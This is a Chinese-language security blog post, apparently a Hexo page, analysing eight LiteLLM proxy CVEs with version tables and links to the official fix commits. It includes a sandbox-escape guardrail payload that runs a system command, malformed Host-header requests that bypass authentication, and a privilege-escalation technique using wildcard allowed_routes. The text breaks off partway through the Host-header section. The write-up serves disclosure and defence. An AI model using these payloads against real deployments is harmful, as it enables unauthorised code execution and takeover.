@@ -1,0 +1,555 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="概览表   CVE 类型 发布时间 影响版本范围 修复版本口径 所需权限 主要影响    CVE-2026-30623 MCP stdio 命令执行 2026-04-15 OX 披露；2026-04-21 LiteLLM 博客 未明确下界；固定口径为修复自 v1.83.6-nightly，首个稳定修复 v1.83.7-stable &gt;&#x3D; v1.83.6-nightly 或 &amp;gt">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Attack of LiteLLM">
+<meta property="og:url" content="http://example.com/2026/06/21/Attack%20of%20LiteLLM/index.html">
+<meta property="og:site_name" content="Z3r4y : Take it easy">
+<meta property="og:description" content="概览表   CVE 类型 发布时间 影响版本范围 修复版本口径 所需权限 主要影响    CVE-2026-30623 MCP stdio 命令执行 2026-04-15 OX 披露；2026-04-21 LiteLLM 博客 未明确下界；固定口径为修复自 v1.83.6-nightly，首个稳定修复 v1.83.7-stable &gt;&#x3D; v1.83.6-nightly 或 &amp;gt">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/images/04/12.png">
+<meta property="og:image" content="http://example.com/images/04/1.png">
+<meta property="og:image" content="http://example.com/images/04/2.png">
+<meta property="og:image" content="http://example.com/images/04/3.png">
+<meta property="og:image" content="http://example.com/images/04/4.png">
+<meta property="og:image" content="http://example.com/images/04/6.png">
+<meta property="og:image" content="http://example.com/images/04/5.png">
+<meta property="og:image" content="http://example.com/images/04/7.png">
+<meta property="og:image" content="http://example.com/images/04/8.png">
+<meta property="og:image" content="http://example.com/images/04/9.png">
+<meta property="og:image" content="http://example.com/images/04/10.png">
+<meta property="og:image" content="http://example.com/images/04/11.png">
+<meta property="og:image" content="http://example.com/images/04/13.png">
+<meta property="og:image" content="http://example.com/images/04/14.png">
+<meta property="og:image" content="http://example.com/images/04/15.png">
+<meta property="og:image" content="http://example.com/images/04/16.png">
+<meta property="og:image" content="http://example.com/images/04/17.png">
+<meta property="og:image" content="http://example.com/images/04/18.png">
+<meta property="og:image" content="http://example.com/images/04/19.png">
+<meta property="og:image" content="http://example.com/images/04/20.png">
+<meta property="og:image" content="http://example.com/images/04/21.png">
+<meta property="og:image" content="http://example.com/images/04/22.png">
+<meta property="og:image" content="http://example.com/images/04/23.png">
+<meta property="og:image" content="http://example.com/images/04/24.png">
+<meta property="og:image" content="http://example.com/images/04/25.png">
+<meta property="article:published_time" content="2026-06-21T04:00:00.000Z">
+<meta property="article:modified_time" content="2026-06-20T19:45:15.272Z">
+<meta property="article:author" content="Z3r4y">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/04/12.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Attack of LiteLLM</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/Z3r4y">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2026/05/20/%E4%B8%B4%E8%A1%8C%E9%9A%8F%E7%AC%94/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2026/06/21/Attack%20of%20LiteLLM/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2026/06/21/Attack%20of%20LiteLLM/&text=Attack of LiteLLM"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2026/06/21/Attack%20of%20LiteLLM/&title=Attack of LiteLLM"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2026/06/21/Attack%20of%20LiteLLM/&is_video=false&description=Attack of LiteLLM"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Attack of LiteLLM&body=Check out this article: http://example.com/2026/06/21/Attack%20of%20LiteLLM/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2026/06/21/Attack%20of%20LiteLLM/&title=Attack of LiteLLM"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2026/06/21/Attack%20of%20LiteLLM/&title=Attack of LiteLLM"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2026/06/21/Attack%20of%20LiteLLM/&title=Attack of LiteLLM"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2026/06/21/Attack%20of%20LiteLLM/&title=Attack of LiteLLM"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2026/06/21/Attack%20of%20LiteLLM/&name=Attack of LiteLLM&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2026/06/21/Attack%20of%20LiteLLM/&t=Attack of LiteLLM"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%A7%88%E8%A1%A8"><span class="toc-number">1.</span> <span class="toc-text">概览表</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2026-30623"><span class="toc-number">1.1.</span> <span class="toc-text">CVE-2026-30623</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2026-42203"><span class="toc-number">1.2.</span> <span class="toc-text">CVE-2026-42203</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2026-42208"><span class="toc-number">1.3.</span> <span class="toc-text">CVE-2026-42208</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2026-42271"><span class="toc-number">1.4.</span> <span class="toc-text">CVE-2026-42271</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2026-40217"><span class="toc-number">1.5.</span> <span class="toc-text">CVE-2026-40217</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2026-47102"><span class="toc-number">1.6.</span> <span class="toc-text">CVE-2026-47102</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2026-47101"><span class="toc-number">1.7.</span> <span class="toc-text">CVE-2026-47101</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2026-49468"><span class="toc-number">1.8.</span> <span class="toc-text">CVE-2026-49468</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%AD%A3%E5%B8%B8%E8%AF%B7%E6%B1%82%E8%A1%8C%E4%B8%BA"><span class="toc-number">1.8.1.</span> <span class="toc-text">正常请求行为</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%95%B8%E5%BD%A2-Host-%E8%AF%B7%E6%B1%82%E8%A1%8C%E4%B8%BA"><span class="toc-number">1.8.2.</span> <span class="toc-text">畸形 Host 请求行为</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#LiteLLM-%E6%97%A7%E7%89%88%E8%B7%AF%E7%94%B1%E8%AE%A1%E7%AE%97%E9%97%AE%E9%A2%98"><span class="toc-number">1.8.3.</span> <span class="toc-text">LiteLLM 旧版路由计算问题</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%89%B4%E6%9D%83%E7%BB%95%E8%BF%87%E9%93%BE%E8%B7%AF"><span class="toc-number">1.8.4.</span> <span class="toc-text">鉴权绕过链路</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E5%A4%8D%E7%8E%B0%E7%BB%93%E6%9E%9C"><span class="toc-number">1.8.5.</span> <span class="toc-text">本地复现结果</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Attack of LiteLLM
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Z3r4y</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2026-06-21T04:00:00.000Z" class="dt-published" itemprop="datePublished">2026-06-21</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p><img src="/images/04/12.png" alt="image12"></p>
+<h2 id="概览表"><a href="#概览表" class="headerlink" title="概览表"></a>概览表</h2><table>
+<thead>
+<tr>
+<th>CVE</th>
+<th>类型</th>
+<th>发布时间</th>
+<th>影响版本范围</th>
+<th>修复版本口径</th>
+<th>所需权限</th>
+<th>主要影响</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>CVE-2026-30623</td>
+<td>MCP stdio 命令执行</td>
+<td>2026-04-15 OX 披露；2026-04-21 LiteLLM 博客</td>
+<td>未明确下界；固定口径为修复自 v1.83.6-nightly，首个稳定修复 v1.83.7-stable</td>
+<td>&gt;&#x3D; v1.83.6-nightly 或 &gt;&#x3D; v1.83.7-stable</td>
+<td>需要有效 LiteLLM API key；涉及 MCP 创建&#x2F;更新权限或测试端点</td>
+<td>以 LiteLLM Proxy 进程权限执行系统命令</td>
+</tr>
+<tr>
+<td>CVE-2026-42203</td>
+<td>&#x2F;prompts&#x2F;test SSTI</td>
+<td>2026-04-20 GHSA；2026-04-24 GitHub DB；2026-05-08 NVD</td>
+<td>&gt;&#x3D; 1.80.5, &lt; 1.83.7</td>
+<td>1.83.7</td>
+<td>任意有效 Proxy API key</td>
+<td>进程内代码执行、环境变量&#x2F;模型凭据泄露、可能执行命令</td>
+</tr>
+<tr>
+<td>CVE-2026-42208</td>
+<td>Proxy API key 校验 SQL 注入</td>
+<td>2026-04-20 GHSA；2026-04-24 GitHub DB；2026-05-08 NVD</td>
+<td>&gt;&#x3D; 1.81.16, &lt; 1.83.7</td>
+<td>1.83.7</td>
+<td>无需有效 key；需能访问 LLM API 路由</td>
+<td>读取&#x2F;修改 Proxy 数据库，可能获取凭据并接管 Proxy</td>
+</tr>
+<tr>
+<td>CVE-2026-42271</td>
+<td>MCP REST 测试端点命令执行</td>
+<td>2026-04-21 GHSA；2026-04-25 GitHub DB；2026-05-08 NVD</td>
+<td>&gt;&#x3D; 1.74.2, &lt; 1.83.7</td>
+<td>1.83.7</td>
+<td>任意有效 Proxy API key，包括低权限 internal user key</td>
+<td>通过 MCP stdio 预览端点在服务端启动攻击者指定命令</td>
+</tr>
+<tr>
+<td>CVE-2026-40217</td>
+<td>Guardrail custom code 沙箱逃逸</td>
+<td>2026-04-08 X41 公开；2026-05-07 GHSA；2026-05-11 GitHub DB</td>
+<td>GHSA 元数据：&gt;&#x3D; 1.81.8, &lt; 1.83.10</td>
+<td>GHSA 元数据标 1.83.10；正文称 1.83.11 替换为 RestrictedPython，建议按最新修复版处理</td>
+<td>默认需要 proxy_admin &#x2F; master key；若叠加路由越权可降低门槛</td>
+<td>在 Proxy 进程内执行任意 Python&#x2F;系统命令，默认 Docker 中可能为 root</td>
+</tr>
+<tr>
+<td>CVE-2026-47102</td>
+<td>&#x2F;user&#x2F;update 字段级权限缺失导致角色提升</td>
+<td>2026-05-21 VulnCheck&#x2F;GitHub DB&#x2F;NVD</td>
+<td>&lt; 1.83.10</td>
+<td>1.83.10</td>
+<td>需要可访问 &#x2F;user&#x2F;update；默认可由 org_admin 利用，低权限用户通常需结合路由越权</td>
+<td>将自身 user_role 改为 proxy_admin，获得管理面控制权</td>
+</tr>
+<tr>
+<td>CVE-2026-47101</td>
+<td>API key allowed_routes 权限提升</td>
+<td>2026-05-21 VulnCheck&#x2F;GitHub DB&#x2F;NVD</td>
+<td>&lt; 1.83.14</td>
+<td>1.83.14</td>
+<td>已认证 internal_user</td>
+<td>创建超出自身角色权限的虚拟 key，访问管理路由，进一步提权到 proxy_admin</td>
+</tr>
+<tr>
+<td>CVE-2026-49468</td>
+<td>Host Header 认证绕过</td>
+<td>2026-05-28 GHSA 项目公告；2026-06-16 GitHub DB&#x2F;GitLab advisory</td>
+<td>&lt; 1.84.0</td>
+<td>1.84.0；后续路径处理加固回补到维护分支</td>
+<td>无需认证；要求 Proxy 对不可信客户端可达且上游未规范化&#x2F;校验 Host</td>
+<td>未认证访问受保护管理路由</td>
+</tr>
+</tbody></table>
+<h3 id="CVE-2026-30623"><a href="#CVE-2026-30623" class="headerlink" title="CVE-2026-30623"></a>CVE-2026-30623</h3><p>当 MCP server 使用 transport: stdio 时，LiteLLM 将后台用户提供的 command 直接交给 MCP client 创建逻辑。stdio MCP 的设计本身就是通过本地进程通信，但如果配置没有 allowlist，就会变成服务端命令执行入口。</p>
+<p><img src="/images/04/1.png" alt="image1"><br><img src="/images/04/2.png" alt="image2"><br><img src="/images/04/3.png" alt="image3"></p>
+<p><strong>官方FIX</strong>：<a target="_blank" rel="noopener" href="https://github.com/BerriAI/litellm/commit/7b7f30467599a52bb028c3c98cbae4f45b4779f3">7b7f304</a></p>
+<p>白名单，对 stdio command 增加 allowlist，例如 npx、uvx、python、python3、node、docker、deno<br><img src="/images/04/4.png" alt="image4"></p>
+<h3 id="CVE-2026-42203"><a href="#CVE-2026-42203" class="headerlink" title="CVE-2026-42203"></a>CVE-2026-42203</h3><p>LiteLLM 将用户可控 prompt template 交给模板引擎渲染。攻击者能够通过构造恶意 prompt template，触发模板引擎的逃逸机制，最终实现进程内代码执行。</p>
+<p><strong>所需权限</strong></p>
+<ul>
+<li>需要任意有效 LiteLLM Proxy API key。</li>
+<li>advisory 明确该端点只检查调用者是否持有有效 proxy API key，因此低权限 authenticated user 也可触达。</li>
+</ul>
+<p><img src="/images/04/6.png" alt="image6"></p>
+<p><strong>官方FIX</strong>：<a target="_blank" rel="noopener" href="https://github.com/BerriAI/litellm/commit/d910a95661fce3cdd36f3b06c03ecf9c46c6457c">d910a95</a><br><img src="/images/04/5.png" alt="image5"></p>
+<p>把 PromptManager.jinja_env 从普通 Jinja 环境换成 ImmutableSandboxedEnvironment，阻断 <strong>class__、__mro__、__globals</strong> 这类危险属性访问</p>
+<h3 id="CVE-2026-42208"><a href="#CVE-2026-42208" class="headerlink" title="CVE-2026-42208"></a>CVE-2026-42208</h3><p>LiteLLM Proxy API key 校验流程中存在 SQL 盲注。攻击者可通过构造 Authorization: Bearer … 头，把未认证输入带入数据库查询路径。</p>
+<p><img src="/images/04/7.png" alt="image7"><br>认证流程提取 Bearer token 后，如果 token 不满足正常 key 格式，会走认证失败处理和日志记录路径。受影响版本在失败日志 enrichment 中会尝试根据 token 查询 key 对象，并在 Prisma get_data(…, table_name&#x3D;”combined_view”) 路径中使用字符串拼接构造 SQL：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Authorization header</span><br><span class="line">-&gt; user_api_key_auth()</span><br><span class="line">-&gt; get_api_key()</span><br><span class="line">-&gt; _get_bearer_token()</span><br><span class="line">-&gt; assert api_key.startswith(&quot;sk-&quot;) 失败</span><br><span class="line">-&gt; authentication error handler</span><br><span class="line">-&gt; post_call_failure_hook()</span><br><span class="line">-&gt; _ProxyDBLogger._enrich_failure_metadata_with_key_info()</span><br><span class="line">-&gt; get_key_object(hashed_token=&lt;payload&gt;)</span><br><span class="line">-&gt; prisma_client.get_data(token=&lt;payload&gt;, table_name=&quot;combined_view&quot;)</span><br><span class="line">-&gt; 拼接 SQL 查询</span><br></pre></td></tr></table></figure>
+<p>因此注入点看起来在 Authorization: Bearer，本质原因是认证失败 fallback 的日志&#x2F;数据库 enrichment 对用户输入进行了非参数化查询。<br>注：需要 Proxy 启用数据库且开启错误日志</p>
+<p><strong>官方FIX</strong>：<a target="_blank" rel="noopener" href="https://github.com/BerriAI/litellm/commit/4dc416ee749122ca91e3bca095217478663419e7">4dc416e</a><br><img src="/images/04/8.png" alt="image8"><br>把拼接 SQL 改成参数化查询</p>
+<h3 id="CVE-2026-42271"><a href="#CVE-2026-42271" class="headerlink" title="CVE-2026-42271"></a>CVE-2026-42271</h3><p>POST &#x2F;mcp-rest&#x2F;test&#x2F;connection 和 POST &#x2F;mcp-rest&#x2F;test&#x2F;tools&#x2F;list 是 MCP server 保存前的预览&#x2F;测试端点。测试端点会根据请求体临时创建 MCP client。若传入 transport: stdio，LiteLLM 会按配置启动本地子进程。修复前这些测试端点只要求有效 proxy API key，没有做 PROXY_ADMIN 角色校验，因此低权限 key 也可触发服务端命令启动。</p>
+<p><strong>所需权限</strong></p>
+<ul>
+<li>任意有效 LiteLLM Proxy API key。</li>
+<li>advisory 明确包括低权限 internal-user key。</li>
+<li>修复后测试端点要求 PROXY_ADMIN。</li>
+</ul>
+<p><img src="/images/04/9.png" alt="image9"><br><img src="/images/04/10.png" alt="image10"></p>
+<p><strong>官方FIX</strong>：<a target="_blank" rel="noopener" href="https://github.com/BerriAI/litellm/commit/7b7f30467599a52bb028c3c98cbae4f45b4779f3">7b7f304</a><br><img src="/images/04/11.png" alt="image11"><br>给接口访问权限加了 proxy_admin_only</p>
+<h3 id="CVE-2026-40217"><a href="#CVE-2026-40217" class="headerlink" title="CVE-2026-40217"></a>CVE-2026-40217</h3><p>POST &#x2F;guardrails&#x2F;test_custom_code 用于测试自定义 Guardrail Python 代码。受影响版本使用手写黑名单&#x2F;正则限制危险操作，但该沙箱可被绕过，导致任意代码执行。</p>
+<p><strong>所需权限</strong></p>
+<ul>
+<li>默认配置下需要 proxy_admin credential 或 master key 才能访问该测试端点。</li>
+<li>若与 CVE-2026-47101 &#x2F; CVE-2026-47102 等权限提升链组合，低权限用户可先提升后再触达该执行面。</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">apply_guardrail</span>(<span class="params">inputs, request_data, input_type</span>):</span><br><span class="line">    bi = http_get(<span class="string">&quot;http://127.0.0.1&quot;</span>).cr_frame.f_builtins</span><br><span class="line">    bi[<span class="string">&quot;__import__&quot;</span>](<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;touch /tmp/success&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> block(<span class="string">&quot;done&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/04/13.png" alt="image13"><br><img src="/images/04/14.png" alt="image14"></p>
+<p><strong>官方FIX</strong>：<a target="_blank" rel="noopener" href="https://github.com/BerriAI/litellm/commit/0a1b4427a6c4ee07add32295e331bd0cf9cac572#diff-4c77b7bbdcb021b5646157e32a0653b1bd1bdcf1db8b5f6af71552067d00d589">0a1b442</a></p>
+<p><img src="/images/04/15.png" alt="image15"><br><img src="/images/04/16.png" alt="image16"></p>
+<p>用 RestrictedPython 替换手写沙箱</p>
+<h3 id="CVE-2026-47102"><a href="#CVE-2026-47102" class="headerlink" title="CVE-2026-47102"></a>CVE-2026-47102</h3><p>&#x2F;user&#x2F;update 允许用户更新自身信息，但受影响版本没有限制可更新字段。能够访问该接口的用户可以把自己的 user_role 修改为 proxy_admin。</p>
+<p><strong>所需权限</strong></p>
+<ul>
+<li>需要已认证，且调用凭据能够访问 &#x2F;user&#x2F;update。</li>
+<li>默认情况下，org_admin 对该接口有合法访问权，可不依赖其他漏洞直接利用。</li>
+<li>普通 internal_user 通常不能直接访问该接口；若先通过 CVE-2026-47101 创建带 &#x2F;user&#x2F;update 路由的 key，则可串联利用。</li>
+</ul>
+<p><img src="/images/04/17.png" alt="image17"></p>
+<p><strong>官方FIX</strong>：<a target="_blank" rel="noopener" href="https://github.com/BerriAI/litellm/commit/e6f18ce75b111c9b93dc15c72894cbdeb53177ce">e6f18ce</a><br><img src="/images/04/18.png" alt="image18"><br>改成proxy_admin_only</p>
+<h3 id="CVE-2026-47101"><a href="#CVE-2026-47101" class="headerlink" title="CVE-2026-47101"></a>CVE-2026-47101</h3><p>LiteLLM 允许创建虚拟 API key，并通过 allowed_routes 限制该 key 可以访问的 API 路由。受影响版本在生成 key 时，没有校验调用者申请的 allowed_routes 是否超出自身角色权限。</p>
+<p>allowed_routes 本应是限制字段，但在漏洞场景中变成授权字段。低权限用户调用 key 生成接口时，可以指定管理路由或通配路由，例如 &#x2F;user&#x2F;*、&#x2F;key&#x2F;*、&#x2F;guardrails&#x2F;<em>、&#x2F;mcp-rest&#x2F;</em> 或历史版本中的 &#x2F;*。服务端把这些路由写入新 key 后，新 key 在路由鉴权层会被认为允许访问对应管理接口，从而绕过原始用户角色限制。</p>
+<p>不同版本利用面略有差异：</p>
+<ul>
+<li>1.82.0：本地复现显示低权限 internal user 可生成 allowed_routes&#x3D;[“&#x2F;*”] 的 key，并访问部分管理路由。</li>
+<li>1.82.6：仍可生成 wildcard key，但部分接口存在 handler 级别角色检查，例如 &#x2F;user&#x2F;list 会被挡住；其他接口仍可能受影响。</li>
+<li>1.83.13：通过 service-account &#x2F; management route 组合越权(team_admin -&gt; proxy_admin)。</li>
+</ul>
+<p>proxy_admin<br>    └── organization<br>          └── org_admin<br>                └── team<br>                      └── team_admin</p>
+<p>1.82.x<br><img src="/images/04/19.png" alt="image19"><br><img src="/images/04/20.png" alt="image20"></p>
+<p>1.83.13<br><img src="/images/04/21.png" alt="image21"><br><img src="/images/04/22.png" alt="image22"></p>
+<p><strong>官方FIX</strong>：<a target="_blank" rel="noopener" href="https://github.com/BerriAI/litellm/commit/2220f3076ac89bd2a2e3439acf57dcfbec2434c9">2220f30</a></p>
+<p><img src="/images/04/23.png" alt="image23"><br>将allowed_routes限制为preset的llm调用接口&#x2F;基础info接口</p>
+<h3 id="CVE-2026-49468"><a href="#CVE-2026-49468" class="headerlink" title="CVE-2026-49468"></a>CVE-2026-49468</h3><p>LiteLLM Proxy 的 Host Header 认证绕过漏洞。</p>
+<p>LiteLLM Proxy 的认证层根据请求路径判断当前路由是否需要鉴权。受影响版本使用 request.url.path &#x2F; request.base_url.path 计算有效路由，而 Starlette&#x2F;FastAPI 的 request.url 会受客户端 Host header 影响。攻击者可构造畸形 Host，让鉴权层误判请求命中了 public route。</p>
+<p>FastAPI 实际路由分发基于 ASGI scope[“path”]，例如真实请求路径仍是 &#x2F;user&#x2F;new。但 LiteLLM 旧版鉴权层从 request.url.path 取路由，而 request.url 是 Starlette 根据请求和 Host header 重构的 URL。</p>
+<p>例如：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/user/new</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:14000/?x=1</span><br></pre></td></tr></table></figure>
+
+<p>在某些条件下：</p>
+<ul>
+<li>FastAPI 仍按 scope[“path”] &#x3D;&#x3D; “&#x2F;user&#x2F;new” 分发到 &#x2F;user&#x2F;new。</li>
+<li>LiteLLM 鉴权层通过 request.url.path 看到的可能是 &#x2F;。</li>
+<li>&#x2F; 是 public route，导致鉴权被跳过。</li>
+</ul>
+<p><strong>所需权限</strong></p>
+<ul>
+<li>无需认证。</li>
+<li>需要 LiteLLM Proxy listener 对不可信客户端可达。</li>
+<li>若前面有 CDN、WAF、反向代理、host-based load balancer 等严格校验或规范化 Host，攻击可能被上游阻断。</li>
+</ul>
+<p><img src="/images/04/24.png" alt="image24"></p>
+<h4 id="正常请求行为"><a href="#正常请求行为" class="headerlink" title="正常请求行为"></a>正常请求行为</h4><p>正常请求：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/user/new</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:14000</span><br></pre></td></tr></table></figure>
+
+<p>Starlette 构造出的 URL：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:14000/user/new</span><br></pre></td></tr></table></figure>
+
+<p>关键字段：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">scope[&quot;path&quot;]       = /user/new</span><br><span class="line">request.url.path    = /user/new</span><br><span class="line">request.base_url    = http://127.0.0.1:14000/</span><br><span class="line">request.base_url.path = /</span><br></pre></td></tr></table></figure>
+
+<p>LiteLLM 旧版 get_request_route() 最终得到：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/user/new</span><br></pre></td></tr></table></figure>
+
+<p>&#x2F;user&#x2F;new 是受保护管理接口，因此无 Authorization 时返回 401。</p>
+<h4 id="畸形-Host-请求行为"><a href="#畸形-Host-请求行为" class="headerlink" title="畸形 Host 请求行为"></a>畸形 Host 请求行为</h4><p>畸形 Host 请求：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/user/new</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:14000/?x=1</span><br></pre></td></tr></table></figure>
+
+<p>真实 HTTP request line 里的路径仍然是：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/user/new</span><br></pre></td></tr></table></figure>
+
+<p>也就是 ASGI scope 中仍然是：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scope[&quot;path&quot;] = /user/new</span><br></pre></td></tr></table></figure>
+
+<p>但 Starlette 在构造 request.url 时会直接拼接 Host header：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url = <span class="string">f&quot;<span class="subst">&#123;scheme&#125;</span>://<span class="subst">&#123;host_header&#125;</span><span class="subst">&#123;path&#125;</span>&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>因此得到：</p>
